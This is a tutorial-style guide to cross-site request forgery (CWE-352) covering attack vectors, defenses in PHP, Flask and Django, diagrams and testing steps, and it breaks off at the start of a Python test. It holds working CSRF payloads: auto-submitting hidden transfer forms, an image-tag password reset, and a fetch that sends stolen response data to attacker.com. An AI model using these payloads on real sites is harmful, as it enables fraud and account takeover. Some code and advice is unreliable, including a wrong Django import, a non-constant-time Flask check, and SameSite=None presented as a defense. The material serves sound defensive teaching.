# CWE-352: Cross-Site Request Forgery (CSRF)

**Rank:** #3 in CWE Top 25 (2025)  
**Severity:** High (CVSS 5.0 - 9.0+)  
**Status:** ⚠️ Active threat in production systems  
**Last Updated:** January 2026

---

## Table of Contents

- [Overview](#overview)
- [Understanding CSRF](#understanding-csrf)
- [Why CSRF Still Exists](#why-csrf-still-exists)
- [Attack Scenarios](#attack-scenarios)
- [Defense Mechanisms](#defense-mechanisms)
- [Implementation Guide](#implementation-guide)
- [Testing & Verification](#testing--verification)
- [Security Checklist](#security-checklist)
- [References](#references)

---

## Overview

**Cross-Site Request Forgery (CSRF)** is a security vulnerability where an attacker tricks an authenticated user into performing unintended actions on a web application.

### The Core Problem

```
Your browser automatically includes session cookies with every request.
The server can't distinguish between:
  ✓ Requests the user intentionally made
  ✗ Requests forged by an attacker
```

### Real-World Impact

| Scenario | Impact |
|----------|--------|
| Bank transfer | Unauthorized money transfer |
| Email change | Account takeover |
| Password reset | Complete account compromise |
| Admin promotion | Privilege escalation |
| Data deletion | Irreversible data loss |
| Worm propagation | Exponential compromise (Samy worm: 1M+ accounts) |

---

## Understanding CSRF

### How CSRF Works

#### Step 1: Attacker Creates Malicious Page

```html
<!-- attacker.com/steal-money.html -->
<form id="csrf-form" 
      action="https://bank.com/transfer" 
      method="POST" 
      style="display:none;">
  <input type="hidden" name="recipient" value="attacker@evil.com">
  <input type="hidden" name="amount" value="10000">
  <input type="hidden" name="account" value="checking">
</form>

<script>
  // Auto-submit when page loads
  document.getElementById('csrf-form').submit();
</script>
```

#### Step 2: Victim Visits Attacker's Page

While logged into their bank account, the victim opens attacker.com (perhaps via phishing link, social media, or compromised site).

#### Step 3: Browser Auto-Submits Request

The JavaScript executes and submits the hidden form:

```http
POST /transfer HTTP/1.1
Host: bank.com
Cookie: sessionID=victim_session_abc123
Content-Type: application/x-www-form-urlencoded

recipient=attacker@evil.com&amount=10000&account=checking
```

#### Step 4: Server Processes as Authenticated Request

The bank server receives the request and sees:
- ✅ Valid session cookie
- ✅ Authenticated user
- ✅ Proper HTTP method (POST)
- ❌ **But never verifies: Did the user actually authorize this transfer?**

```
Server: "User is authenticated, session is valid → Process transfer"
Result: $10,000 transferred to attacker
```

---

### Attack Vectors

#### Vector 1: Hidden Form Submission (POST)

```html
<!-- Silent, no user interaction needed -->
<form action="https://victim.com/admin/delete-user" 
      method="POST" 
      style="display:none;">
  <input name="user_id" value="42">
  <input name="confirm" value="yes">
</form>
<script>document.forms[0].submit();</script>
```

**Why it works:**
- POST requests don't appear in browser history
- User sees no indication a request was sent
- Attacker can hide the form off-screen or disguise the page

#### Vector 2: Image Tag (GET)

```html
<!-- Exploits GET-based state changes -->
<img src="https://router.local/admin/reset-password?user=admin&new=hacked" 
     style="display:none;">
```

**Why it works:**
- `<img>` tags trigger HTTP requests automatically
- Browser includes cookies with the request
- No user interaction required
- Works even if JavaScript is disabled

#### Vector 3: XMLHttpRequest/Fetch

```javascript
// From attacker.com, while victim is logged into victim.com
fetch('https://victim.com/api/transfer', {
  method: 'POST',
  credentials: 'include',  // Send cookies with cross-origin request
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({
    recipient: 'attacker@evil.com',
    amount: 50000
  })
})
.then(response => response.json())
.then(data => {
  // Send response back to attacker
  fetch('https://attacker.com/log?data=' + btoa(JSON.stringify(data)));
});
```

**Why it works:**
- CORS misconfiguration may allow cross-origin requests
- `credentials: 'include'` sends cookies despite cross-origin
- Attacker can read response if CORS headers permit

#### Vector 4: Link Exploitation

```html
<!-- Innocent-looking link with malicious GET -->
<a href="https://admin.company.com/delete-user?id=42&confirm=yes">
  Click here to see latest news!
</a>

<!-- Or auto-redirect -->
<meta http-equiv="refresh" 
      content="0; url=https://victim.com/api/delete?id=42">
```

---

## Why CSRF Still Exists

### Reason 1: Confusion Between Authentication & Authorization

```php
// VULNERABLE CODE
session_start();

// Check: "Is there a valid session?"
if (!isset($_SESSION['user_id'])) {
    die("Not authenticated");
}

// ✓ Session exists
// ✗ But: Is THIS REQUEST authorized by the user?
// Server doesn't verify intent → CSRF vulnerability

process_payment($_POST['amount'], $_POST['recipient']);
```

**The Fix:** Verify not just authentication, but *intent*.

### Reason 2: Using GET for State Changes

```php
// VULNERABLE - GET modifies state
if (isset($_GET['delete_id'])) {
    User::delete($_GET['delete_id']);
}

// Attack: <img src="/user/delete?delete_id=42">
// or: <a href="/user/delete?delete_id=42">Click me</a>
```

**The Fix:** Use POST/PUT/DELETE for state-changing operations.

### Reason 3: Modern JavaScript Frameworks

```javascript
// Modern SPA frameworks make it easy to forget CSRF protection
fetch('/api/transfer', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ amount: 1000 })
  // ❌ No CSRF token included
  // ❌ Forgot to disable credentials: 'include'
})
```

### Reason 4: API Security Confusion

```
Myth: "My API returns JSON, so it's safe"
Truth: CSRF works with JSON too if credentials are included

Myth: "HTTPS protects against CSRF"
Truth: Encryption doesn't prevent request forgery

Myth: "Checking Referer header is sufficient"
Truth: Can be disabled by users, spoofed via XSS
```

---

## Attack Scenarios

### Scenario 1: Financial Fraud

```
1. Attacker compromises ad network
2. Injects malicious ad on news website
3. User visits news.com while logged into bank.com
4. Ad executes: <img src="bank.com/transfer?to=attacker&amount=5000">
5. Bank processes legitimate session → $5000 transferred
6. User discovers fraud days later
```

### Scenario 2: Account Takeover

```
1. Attacker sends phishing email with link
2. Link points to attacker.com with hidden form
3. Form changes user's email, then password
4. User can no longer log in
5. Attacker now owns account
```

### Scenario 3: Malware Distribution (Samy Worm Pattern)

```
Stage 1: CSRF Injects XSS
  - Attacker sends CSRF request to inject JavaScript into victim's profile
  - JavaScript stored in victim.com database

Stage 2: Exponential Propagation
  - Friend visits victim's profile
  - XSS payload executes in friend's context
  - Friend's profile is also modified (CSRF + XSS)
  - Worm spreads to friend's friends...

Result: Exponential growth
  Hour 0: 1 infected (attacker)
  Hour 1: 10 infected
  Hour 2: 100 infected
  Hour 3: 1,000 infected
  Hour 4: 10,000+ infected
  ...
  MySpace Samy worm: 1,000,000+ accounts in 24 hours
```

---

## Defense Mechanisms

### Defense 1: CSRF Tokens (Recommended)

CSRF tokens are the primary defense. They verify that a request came from your application, not an external attacker.

#### How It Works

```
1. Server generates unique token for each form
2. Token included in form as hidden input
3. Attacker doesn't know token value (can't read due to SOP)
4. Server validates token before processing
5. Request without valid token is rejected
```

#### Implementation

**PHP:**

```php
<?php
session_start();

// 1. GENERATE TOKEN (once per session)
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
    // bin2hex(): Convert 32 bytes to 64-character hex string
    // random_bytes(): Cryptographically secure RNG
    // Result: 256-bit token (exceeds 128-bit minimum)
}

// 2. INCLUDE IN FORM
echo '<form method="POST" action="/transfer">';
echo '<input type="hidden" name="csrf_token" value="' . 
     htmlspecialchars($_SESSION['csrf_token']) . '">';
echo '<input type="text" name="recipient" required>';
echo '<input type="number" name="amount" required>';
echo '<button type="submit">Transfer</button>';
echo '</form>';

// 3. VALIDATE BEFORE PROCESSING
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // CRITICAL: Use hash_equals() for constant-time comparison
    // Prevents timing attacks
    if (!isset($_POST['csrf_token']) || 
        !hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'])) {
        http_response_code(403);
        exit('CSRF token validation failed');
    }
    
    // Token is valid, safe to process
    process_transfer($_POST['recipient'], $_POST['amount']);
}
?>
```

**Python/Flask:**

```python
from flask import Flask, request, session, render_template_string
import secrets

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)

# 1. GENERATE TOKEN
@app.before_request
def generate_csrf_token():
    if 'csrf_token' not in session:
        session['csrf_token'] = secrets.token_hex(32)

# 2. INCLUDE IN FORM (template)
form_html = '''
<form method="POST" action="/transfer">
    <input type="hidden" name="csrf_token" value="{{ csrf_token }}">
    <input type="text" name="recipient" required>
    <input type="number" name="amount" required>
    <button type="submit">Transfer</button>
</form>
'''

@app.route('/transfer_page', methods=['GET'])
def transfer_page():
    return render_template_string(form_html, csrf_token=session['csrf_token'])

# 3. VALIDATE BEFORE PROCESSING
@app.route('/transfer', methods=['POST'])
def transfer():
    # Validate token
    if request.form.get('csrf_token') != session.get('csrf_token'):
        return 'CSRF token invalid', 403
    
    # Process transfer
    recipient = request.form.get('recipient')
    amount = request.form.get('amount')
    process_transfer(recipient, amount)
    
    return 'Transfer successful', 200
```

**Django (Built-in):**

```python
# Django handles CSRF automatically

from django.http import HttpResponse
from django.views.decorators.http import require_http_methods
from django.middleware.csrf import csrf_protect
from django.template import Template, Context

# 1. GENERATE & INCLUDE (automatic via {% csrf_token %} tag)
@require_http_methods(["GET", "POST"])
def transfer(request):
    if request.method == 'GET':
        # Template automatically includes CSRF token
        return render(request, 'transfer.html')
    
    elif request.method == 'POST':
        # 2. VALIDATE (automatic via csrf_protect decorator)
        recipient = request.POST.get('recipient')
        amount = request.POST.get('amount')
        
        # If CSRF token is invalid, Django rejects automatically
        process_transfer(recipient, amount)
        return HttpResponse('Transfer successful')

# transfer.html
"""
<form method="post">
    {% csrf_token %}
    <input type="text" name="recipient" required>
    <input type="number" name="amount" required>
    <button type="submit">Transfer</button>
</form>
"""
```

#### Why hash_equals() is Critical

```php
// ❌ VULNERABLE: String comparison with ==
if ($_POST['token'] == $_SESSION['token']) {
    process_request();
}

// Vulnerability: Timing Attack
// "abc123def456" == "abc123xyz789"
//  Comparison exits at 7th character
// Takes different time based on where match fails
// Attacker measures response times → deduces token bits
// Risk: Token can be brute-forced through timing analysis

// ✅ SECURE: hash_equals() constant-time comparison
if (hash_equals($_SESSION['token'], $_POST['token'])) {
    process_request();
}

// Why it works:
// - Compares ALL bytes regardless of content
// - Time taken is independent of token value
// - Timing attack impossible
// - Attacker cannot deduce token through timing side-channel
```

---

### Defense 2: SameSite Cookie Attribute

SameSite tells the browser when to include cookies with requests.

#### Implementation

```php
// PHP 7.3+
session_set_cookie_params([
    'httponly' => true,      // Block JavaScript access (prevents XSS theft)
    'secure' => true,        // HTTPS only
    'samesite' => 'Lax',     // Key setting for CSRF protection
    'path' => '/',
    'domain' => '.example.com'
]);
session_start();

// Or manual header
header('Set-Cookie: sessionID=' . $token . 
       '; SameSite=Lax; HttpOnly; Secure; Path=/; Domain=.example.com');
```

**JavaScript:**

```javascript
// Modern browsers support SameSite automatically
// No code needed on client side
// Browser enforces at network level
```

#### SameSite Values Explained

| Value | Behavior | Use Case |
|-------|----------|----------|
| **Strict** | Cookie NOT sent with any cross-origin request | Maximum security, breaks some features |
| **Lax** | Cookie sent for top-level navigation (GET), blocked for forms (POST) | Best default for most apps |
| **None** | Cookie always sent (requires `Secure` flag) | Legitimate cross-origin use (federated login, CDN) |

**Which to Use?**

```
Default: SameSite=Lax
Sensitive operations: SameSite=Strict
Cross-origin required: SameSite=None; Secure
```

#### Browser Support

```
Chrome:    v80+ (Feb 2020) - Default Lax
Firefox:   v95+ (Nov 2021) - Default Lax
Safari:    v13.1+ (Mar 2020)
Edge:      v80+ (Feb 2020)
IE:        No support (ignored)

Coverage: ~92% of users benefit from SameSite
```

---

### Defense 3: Origin Header Validation

```php
// Validate that request came from your domain
if ($_SERVER['REQUEST_METHOD'] !== 'GET') {
    $origin = $_SERVER['HTTP_ORIGIN'] ?? null;
    $allowed_origins = [
        'https://example.com',
        'https://www.example.com',
        'https://api.example.com'
    ];
    
    if (!in_array($origin, $allowed_origins)) {
        http_response_code(403);
        exit('Origin validation failed');
    }
}
```

**Limitations:**
- XSS can spoof Origin header
- Older browsers may not send it
- Use as secondary defense, not primary

---

### Defense 4: Never Use GET for State Changes

```php
// ❌ VULNERABLE
if (isset($_GET['delete_id'])) {
    User::delete($_GET['delete_id']);
}

// ✅ SECURE
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['delete_id'])) {
    User::delete($_POST['delete_id']);
}
```

**Why:**
- GET appears in:
  - Browser history
  - Server logs
  - Referer headers
  - Proxy caches
- GET is used by prefetchers, scrapers, bots
- GET changes are trivial to exploit with `<img>`, links, prefetch

---

## Implementation Guide

### Step 1: Identify Vulnerable Operations

```
State-changing operations (need protection):
  ✓ POST /transfer
  ✓ PUT /user/update
  ✓ DELETE /item/123
  ✓ PATCH /settings

Safe operations (don't need CSRF token):
  ✗ GET /data
  ✗ HEAD /resource
  ✗ OPTIONS /endpoint
```

### Step 2: Choose Your Defense Strategy

```
Decision Tree:

Need backward compatibility?
  → Yes: Use CSRF tokens + SameSite
  → No: Use SameSite=Lax alone (modern browsers)

Stateless architecture (load-balanced)?
  → Yes: Use double-submit tokens
  → No: Use session-based tokens

API or HTML forms?
  → HTML forms: Token in hidden input
  → API: Token in custom header (X-CSRF-Token)
```

### Step 3: Generate Secure Tokens

```php
// ✅ CORRECT: Cryptographically secure
$token = bin2hex(random_bytes(32));
// 256-bit token, hex-encoded = 64 characters

// ❌ WRONG: Predictable
$token = md5(time());           // Time-based, predictable
$token = substr(uniqid(), 0, 8); // Insufficient entropy
$token = hash('sha1', $user_id); // Deterministic
```

### Step 4: Validate with hash_equals()

```php
// ✅ CORRECT: Constant-time
if (hash_equals($_SESSION['token'], $_POST['token'])) {
    // Valid
}

// ❌ WRONG: Vulnerable to timing attack
if ($_POST['token'] === $_SESSION['token']) {
    // Vulnerable
}

if ($_POST['token'] == $_SESSION['token']) {
    // Very vulnerable
}
```

### Step 5: Set Cookie Flags Correctly

```php
session_set_cookie_params([
    'httponly' => true,       // ✓ JavaScript can't access
    'secure' => true,         // ✓ HTTPS only
    'samesite' => 'Lax',      // ✓ Block cross-origin POST
    'path' => '/',            // ✓ Entire domain
]);
```

### Step 6: Prevent XSS (Critical!)

```php
// CSRF defenses fail if XSS is present
// Attacker can: read token, forge request, bypass CSRF

// Prevent XSS:
// 1. Input validation (whitelist allowed inputs)
// 2. Output encoding (escape before display)
// 3. Content Security Policy (CSP headers)
// 4. Use templating engines (auto-escape by default)

// Example:
echo htmlspecialchars($user_input); // Escape for HTML
echo htmlspecialchars($var, ENT_QUOTES, 'UTF-8'); // Escape for attributes
```

---

## Visual Attack & Defense Flow

```mermaid
graph TD
    A["🎯 Attacker's Goal:<br/>Trick user into unintended action"] --> B["Step 1: Create Malicious Page<br/>attacker.com"]
    
    B --> B1["Hidden form with:<br/>- Target URL victim.com/transfer<br/>- Attacker's values<br/>- Auto-submit JavaScript"]
    
    B1 --> C["Step 2: Lure Victim<br/>Email link / Ad / Social media"]
    
    C --> C1["Victim is already logged into<br/>victim.com in another tab"]
    
    C1 --> D["Step 3: Victim Visits<br/>attacker.com"]
    
    D --> E["Step 4: JavaScript Executes<br/>form.submit()"]
    
    E --> F["Step 5: Browser Sends Request<br/>POST /transfer HTTP/1.1"]
    
    F --> F1["Browser auto-includes:<br/>Cookie: sessionID=victim_session<br/>User-Agent, etc."]
    
    F1 --> G["Request reaches victim.com<br/>Server receives POST"]
    
    G --> H{"🔍 Server Validation Check"}
    
    H -->|No CSRF Protection| I["❌ VULNERABLE<br/>Session valid → Process<br/>Transfer executed<br/>Attacker wins"]
    
    H -->|With CSRF Token| J["✅ Token Present?"]
    
    J -->|Missing| K["❌ Reject<br/>HTTP 403 Forbidden<br/>Attack blocked"]
    
    J -->|Present| L["Check Token Validity<br/>hash_equals comparison"]
    
    L -->|Invalid| M["❌ Reject<br/>HTTP 403 Forbidden<br/>Attack blocked"]
    
    L -->|Valid| N["✅ Token Valid<br/>Request intent verified<br/>Process transfer"]
    
    H -->|SameSite=Lax| O["🔒 Browser Check<br/>Cross-origin POST?"]
    
    O -->|Yes| P["❌ Browser Blocks<br/>Cookie not sent<br/>Request fails"]
    
    O -->|No| Q["✅ Cookie sent<br/>But CSRF token still required"]
    
    style A fill:#ff6b6b,color:#fff,stroke:#c92a2a,stroke-width:2px
    style I fill:#ff6b6b,color:#fff,stroke:#c92a2a,stroke-width:2px
    style K fill:#51cf66,color:#fff,stroke:#2f9e44,stroke-width:2px
    style M fill:#51cf66,color:#fff,stroke:#2f9e44,stroke-width:2px
    style P fill:#51cf66,color:#fff,stroke:#2f9e44,stroke-width:2px
    style N fill:#4ecdc4,color:#000,stroke:#0F6E56,stroke-width:2px
    style H fill:#ffd93d,color:#000,stroke:#f08c00,stroke-width:2px
    style O fill:#ffd93d,color:#000,stroke:#f08c00,stroke-width:2px
```

### Flow Explanation

**Red (Vulnerable Path):**
- Attacker succeeds when server only checks session validity
- No CSRF token verification
- No SameSite protection
- Unintended action executes

**Green (Protected Paths):**
- CSRF token missing/invalid → Rejected (403)
- SameSite blocks cookie → Request fails
- Defense-in-depth prevents exploitation

**Yellow (Decision Points):**
- Server validation determines success/failure
- Multiple layers of defense

---

## Detailed Attack Flow Diagram

```mermaid
graph LR
    subgraph "Attacker Side (attacker.com)"
        A1["1. Craft Malicious Form<br/>with state-changing action"] --> A2["2. Auto-submit JavaScript<br/>form.submit()"]
        A2 --> A3["3. Host on attacker.com<br/>or inject into 3rd party site"]
    end
    
    subgraph "Victim's Browser"
        B1["4. Victim visits attacker.com<br/>Still logged into victim.com"] --> B2["5. JavaScript auto-executes<br/>Hidden form submits"]
        B2 --> B3["6. Browser auto-includes<br/>session cookie<br/>Cookie: sessionID=..."]
    end
    
    subgraph "Victim Server (victim.com)"
        C1["7. Server receives POST request<br/>with valid session"] --> C2{"8. Validation Check<br/>Authentication?"}
        
        C2 -->|Unprotected| C3["❌ VULNERABLE<br/>Session=Valid → Process"]
        C2 -->|Protected| C4{"Has CSRF Token?"}
        
        C4 -->|No Token| C5["❌ Reject 403"]
        C4 -->|Has Token| C6{"Token == Expected?"}
        
        C6 -->|hash_equals fail| C7["❌ Reject 403"]
        C6 -->|hash_equals pass| C8["✅ Accept & Process<br/>Request intent verified"]
    end
    
    subgraph "Defense Layers"
        D1["Layer 1: CSRF Token<br/>Unique per form"] -.-> C4
        D2["Layer 2: SameSite=Lax<br/>Block cross-origin"] -.-> B3
        D3["Layer 3: Origin Validation<br/>Check request source"] -.-> C2
        D4["Layer 4: hash_equals<br/>Constant-time compare"] -.-> C6
    end
    
    A3 --> B1
    C3 --> |Unintended Action| I["💸 Transfer executed<br/>🔓 Account compromised<br/>📊 Data modified"]
    C5 --> |Attack Blocked| J["✅ Secure<br/>🛡️ Attack prevented"]
    C7 --> |Attack Blocked| J
    C8 --> |Safe Path| J
    
    style A1 fill:#ff6b6b,color:#fff
    style A2 fill:#ff6b6b,color:#fff
    style A3 fill:#ff6b6b,color:#fff
    style C3 fill:#ff6b6b,color:#fff,stroke:#c92a2a,stroke-width:2px
    style C5 fill:#51cf66,color:#fff
    style C7 fill:#51cf66,color:#fff
    style C8 fill:#4ecdc4,color:#000
    style J fill:#51cf66,color:#fff,stroke:#2f9e44,stroke-width:2px
    style I fill:#ff6b6b,color:#fff,stroke:#c92a2a,stroke-width:2px
    style D1 fill:#ffd93d,color:#000
    style D2 fill:#ffd93d,color:#000
    style D3 fill:#ffd93d,color:#000
    style D4 fill:#ffd93d,color:#000
```

---

## Defense Implementation Decision Tree

```mermaid
graph TD
    START["Start: Implementing CSRF Defense"] --> Q1{"What type of<br/>application?"}
    
    Q1 -->|Traditional HTML Forms| Q2["Use Session-Based Tokens"]
    Q1 -->|Modern SPA/API| Q3["Use Custom Headers"]
    Q1 -->|Load-Balanced Cluster| Q4["Use Double-Submit Tokens"]
    
    Q2 --> T1["1️⃣ Generate token per form:<br/>bin2hex random_bytes 32<br/>Store in _SESSION"]
    T1 --> T2["2️⃣ Include in form:<br/>input type=hidden<br/>name=csrf_token"]
    T2 --> T3["3️⃣ Validate on POST:<br/>hash_equals check"]
    
    Q3 --> A1["1️⃣ Generate token per request:<br/>256-bit cryptographic RNG"]
    A1 --> A2["2️⃣ Send to client:<br/>meta tag or API response"]
    A2 --> A3["3️⃣ Include in requests:<br/>X-CSRF-Token: header"]
    A3 --> A4["4️⃣ Validate server-side:<br/>hash_equals comparison"]
    
    Q4 --> C1["1️⃣ Generate token:<br/>random_bytes 32"]
    C1 --> C2["2️⃣ Set in both places:<br/>Cookie: csrf_token=...<br/>Form input: csrf_token=..."]
    C2 --> C3["3️⃣ JavaScript reads cookie:<br/>Include in form"]
    C3 --> C4["4️⃣ Validate match:<br/>Cookie value == Form value"]
    
    T3 --> S1["Set Cookie Flags:<br/>HttpOnly=true<br/>Secure=true<br/>SameSite=Lax"]
    A4 --> S1
    C4 --> S1
    
    S1 --> S2["Add Secondary Defenses:<br/>Origin header check<br/>Referer validation<br/>No GET state changes"]
    
    S2 --> TEST["Test Implementation:<br/>Manual testing<br/>Automated scanning<br/>Code review"]
    
    TEST --> DEPLOY["Deploy Protected:<br/>Production ready<br/>Fully hardened"]
    
    style START fill:#ff6b6b,color:#fff,stroke:#c92a2a,stroke-width:2px
    style Q1 fill:#ffd93d,color:#000,stroke:#f08c00,stroke-width:2px
    style T1 fill:#4ecdc4,color:#000
    style A1 fill:#4ecdc4,color:#000
    style C1 fill:#4ecdc4,color:#000
    style S1 fill:#51cf66,color:#fff
    style TEST fill:#51cf66,color:#fff
    style DEPLOY fill:#51cf66,color:#fff,stroke:#2f9e44,stroke-width:2px
```

---

## CSRF Vulnerability Testing Flowchart

```mermaid
graph TD
    TEST_START["Start Security Testing:<br/>CSRF Vulnerability Assessment"] --> TEST1["Test 1: Missing CSRF Token<br/>Submit form without token"]
    
    TEST1 --> TEST1_RES{"Request accepted?"}
    TEST1_RES -->|Yes 200 OK| VULN1["⚠️ VULNERABLE<br/>No token validation"]
    TEST1_RES -->|No 403| PASS1["✅ Protected<br/>Token required"]
    
    PASS1 --> TEST2["Test 2: Invalid Token<br/>Submit with wrong token"]
    VULN1 --> STOP1["🚨 HIGH RISK<br/>Immediate fix required"]
    
    TEST2 --> TEST2_RES{"Request accepted?"}
    TEST2_RES -->|Yes 200 OK| VULN2["⚠️ VULNERABLE<br/>No token verification"]
    TEST2_RES -->|No 403| PASS2["✅ Protected<br/>Token validated"]
    
    VULN2 --> STOP2["🚨 HIGH RISK<br/>Token not verified"]
    PASS2 --> TEST3["Test 3: GET State Changes<br/>Call with GET method"]
    
    TEST3 --> TEST3_RES{"GET modifies state?"}
    TEST3_RES -->|Yes| VULN3["⚠️ VULNERABLE<br/>GET should never change state"]
    TEST3_RES -->|No| PASS3["✅ Protected<br/>POST/PUT/DELETE only"]
    
    VULN3 --> STOP3["🚨 CRITICAL<br/>GET state changes allow img/link exploits"]
    PASS3 --> TEST4["Test 4: Cross-Origin Request<br/>Submit from attacker.com"]
    
    TEST4 --> TEST4_RES{"Request succeeds?"}
    TEST4_RES -->|Yes| CHECK_SAMESITE{"SameSite<br/>set?"}
    TEST4_RES -->|No| PASS4["✅ Protected<br/>Cross-origin blocked"]
    
    CHECK_SAMESITE -->|No| VULN4["⚠️ RISKY<br/>No SameSite attribute"]
    CHECK_SAMESITE -->|Yes Lax/Strict| PASS4
    
    VULN4 --> WARN4["⚠️ MEDIUM RISK<br/>Add SameSite header"]
    PASS4 --> TEST5["Test 5: Timing Attack<br/>Measure response times"]
    
    TEST5 --> TEST5_RES{"Time varies<br/>with token?"}
    TEST5_RES -->|Yes| VULN5["⚠️ RISKY<br/>Timing side-channel"]
    TEST5_RES -->|No| PASS5["✅ Protected<br/>Constant-time compare"]
    
    VULN5 --> WARN5["⚠️ MEDIUM RISK<br/>Use hash_equals"]
    PASS5 --> FINAL["All Tests Passed ✅<br/>CSRF Protection: Verified"]
    
    STOP1 --> SUMMARY["Test Summary<br/>Critical Issues Found"]
    STOP2 --> SUMMARY
    STOP3 --> SUMMARY
    WARN4 --> SUMMARY
    WARN5 --> SUMMARY
    
    SUMMARY --> REPORT["Generate Security Report<br/>Document findings<br/>Create remediation plan"]
    
    FINAL --> DEPLOY_OK["✅ Ready for Production<br/>Full CSRF Protection<br/>Defense-in-depth"]
    
    style TEST_START fill:#ff6b6b,color:#fff,stroke:#c92a2a,stroke-width:2px
    style VULN1 fill:#ff6b6b,color:#fff
    style VULN2 fill:#ff6b6b,color:#fff
    style VULN3 fill:#ff6b6b,color:#fff
    style VULN4 fill:#ffd93d,color:#000
    style VULN5 fill:#ffd93d,color:#000
    style PASS1 fill:#51cf66,color:#fff
    style PASS2 fill:#51cf66,color:#fff
    style PASS3 fill:#51cf66,color:#fff
    style PASS4 fill:#51cf66,color:#fff
    style PASS5 fill:#51cf66,color:#fff
    style STOP1 fill:#c92a2a,color:#fff,stroke:#8b0000,stroke-width:2px
    style STOP2 fill:#c92a2a,color:#fff,stroke:#8b0000,stroke-width:2px
    style STOP3 fill:#c92a2a,color:#fff,stroke:#8b0000,stroke-width:2px
    style WARN4 fill:#f08c00,color:#fff,stroke:#d4610b,stroke-width:2px
    style WARN5 fill:#f08c00,color:#fff,stroke:#d4610b,stroke-width:2px
    style FINAL fill:#51cf66,color:#fff,stroke:#2f9e44,stroke-width:2px
    style DEPLOY_OK fill:#2f9e44,color:#fff,stroke:#1b5e20,stroke-width:3px
```

---

## Attack Vector Decision Matrix

```mermaid
graph TD
    ATTACKER["🎯 Attacker Goal:<br/>Execute action on victim.com"] --> CHOICE1{"Attacker<br/>Skill Level?"}
    
    CHOICE1 -->|Beginner| VECTOR1["📸 Image Tag<br/>easiest no JS needed"]
    CHOICE1 -->|Intermediate| VECTOR2["📝 Hidden Form<br/>moderate JS required"]
    CHOICE1 -->|Advanced| VECTOR3["🔗 XHR/Fetch<br/>hardest CORS needed"]
    
    VECTOR1 --> IMG1["Use img src to<br/>trigger GET request"]
    IMG1 --> IMG2["img src='victim.com/admin/delete?id=42'"]
    IMG2 --> IMG3["Browser sends<br/>GET request<br/>with cookies"]
    IMG3 --> IMG_DEFENSE["Defense:<br/>✓ Don't use GET<br/>✓ CSRF token<br/>✓ SameSite=Strict"]
    
    VECTOR2 --> FORM1["Create hidden form<br/>with POST data"]
    FORM1 --> FORM2["Add JavaScript<br/>form.submit()"]
    FORM2 --> FORM3["Host on attacker.com<br/>or 3rd party site"]
    FORM3 --> FORM_DEFENSE["Defense:<br/>✓ CSRF token<br/>✓ SameSite=Lax<br/>✓ Origin header"]
    
    VECTOR3 --> XHR1["Use fetch/XHR from<br/>attacker.com"]
    XHR1 --> XHR2["Set credentials:<br/>include"]
    XHR2 --> XHR3["Send to victim.com<br/>with victim's cookies"]
    XHR3 --> XHR_DEFENSE["Defense:<br/>✓ CSRF token<br/>✓ CORS policy<br/>✓ SameSite=None"]
    
    IMG_DEFENSE --> FINAL1["Attack Success:<br/>GET executed<br/>Attacker wins"]
    FORM_DEFENSE --> FINAL2["Attack Blocked:<br/>Token invalid<br/>Request rejected"]
    XHR_DEFENSE --> FINAL3["Attack Blocked:<br/>CORS/SameSite<br/>Request rejected"]
    
    FINAL1 --> OUTCOME1["💥 Unprotected<br/>Vulnerable to<br/>all three vectors"]
    FINAL2 --> OUTCOME2["🛡️ Protected<br/>Modern defenses<br/>Multiple layers"]
    FINAL3 --> OUTCOME3["✅ Secure<br/>Full CSRF<br/>protection"]
    
    style ATTACKER fill:#ff6b6b,color:#fff,stroke:#c92a2a,stroke-width:2px
    style VECTOR1 fill:#FFE5E5,color:#501313,stroke:#E24B4A,stroke-width:2px
    style VECTOR2 fill:#FFE5E5,color:#501313,stroke:#E24B4A,stroke-width:2px
    style VECTOR3 fill:#FFE5E5,color:#501313,stroke:#E24B4A,stroke-width:2px
    style IMG_DEFENSE fill:#EAF3DE,color:#173404,stroke:#3B6D11,stroke-width:2px
    style FORM_DEFENSE fill:#EAF3DE,color:#173404,stroke:#3B6D11,stroke-width:2px
    style XHR_DEFENSE fill:#EAF3DE,color:#173404,stroke:#3B6D11,stroke-width:2px
    style FINAL1 fill:#ff6b6b,color:#fff,stroke:#c92a2a,stroke-width:2px
    style FINAL2 fill:#51cf66,color:#fff,stroke:#2f9e44,stroke-width:2px
    style FINAL3 fill:#51cf66,color:#fff,stroke:#2f9e44,stroke-width:2px
    style OUTCOME1 fill:#c92a2a,color:#fff,stroke:#8b0000,stroke-width:2px
    style OUTCOME2 fill:#51cf66,color:#fff,stroke:#2f9e44,stroke-width:2px
    style OUTCOME3 fill:#2f9e44,color:#fff,stroke:#1b5e20,stroke-width:3px
```

---

## Testing & Verification

### Manual Testing

**Test 1: Missing Token**

```bash
# Try POST without CSRF token
curl -X POST \
  -H "Cookie: sessionID=valid_session" \
  -d "amount=1000&recipient=attacker@evil.com" \
  https://target.com/api/transfer

# Expected: 403 Forbidden
# If: 200 OK → VULNERABLE
```

**Test 2: Invalid Token**

```bash
# Try with wrong token
curl -X POST \
  -H "Cookie: sessionID=valid_session" \
  -d "csrf_token=invalid123&amount=1000" \
  https://target.com/api/transfer

# Expected: 403 Forbidden
# If: 200 OK → VULNERABLE
```

**Test 3: GET-Based State Change**

```bash
# Try GET for state-changing operation
curl "https://target.com/admin/delete-user?id=42"

# Expected: 405 Method Not Allowed or 400 Bad Request
# If: 200 OK → VULNERABLE
```

**Test 4: Cross-Origin Form Submission**

```html
<!-- On attacker.com -->
<form action="https://target.com/api/transfer" method="POST">
  <input name="amount" value="1000">
  <input name="recipient" value="attacker@evil.com">
</form>
<script>document.forms[0].submit();</script>

<!-- Expected: Request blocked or rejected
     If: Request succeeds → Check SameSite & CSRF tokens
```

### Automated Testing

**Using OWASP ZAP:**

```bash
zaproxy -cmd \
  -quickurl https://target.com \
  -quickout csrf_report.html
```

**Using Burp Suite:**

1. Enable "Scan for CSRF vulnerabilities" in scanner settings
2. Run active scan
3. Review findings for "CSRF" vulnerabilities

**Using Semgrep:**

```bash
semgrep --config=p/cwe-top-25 /app/src
# Detects missing CSRF tokens, unsafe comparisons, etc.
```

**Custom Python Test:**

```python
import requests
